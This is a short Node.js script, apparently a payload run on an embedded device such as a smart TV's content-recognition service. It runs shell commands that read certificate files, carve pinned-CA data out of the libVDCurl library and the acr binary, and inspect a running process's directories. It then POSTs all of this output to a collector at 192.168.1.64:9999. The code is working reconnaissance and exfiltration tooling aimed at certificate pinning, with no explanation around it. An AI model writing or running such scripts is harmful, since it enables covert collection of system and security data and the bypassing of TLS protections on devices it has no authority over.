"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 4000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.root_pem = sh("ls -la /ca.pem /usr/local/ssl/cert.pem /usr/lib/acr/cert/ 2>&1 | head -12");
out.pin_head = sh("head -8 /usr/lib/acr/cert/ca.pem; echo ---; grep -aob '/ca.pem' /usr/bin/acr /usr/lib/libVDCurl.so.0.9 | head -5; echo ---; dd if=/usr/lib/libVDCurl.so.0.9 bs=1 skip=$(( $(grep -aob '/ca.pem' /usr/lib/libVDCurl.so.0.9 | head -1 | cut -d: -f1) - 60 )) count=140 2>/dev/null | tr -c '\\40-\\176' '.'");
out.strings_ctx = sh("grep -aoE '[ -~]{6,}' /usr/lib/libVDCurl.so.0.9 2>/dev/null | grep -iE 'ca\.pem|cainfo|capath|verify|cert' | head -20");
out.acr_cwd = sh("ls -la /proc/1902/cwd 2>&1; readlink /proc/1902/cwd 2>&1; ls -la /proc/1902/root 2>&1 | head -2");
post("/acr_pinfile", out);
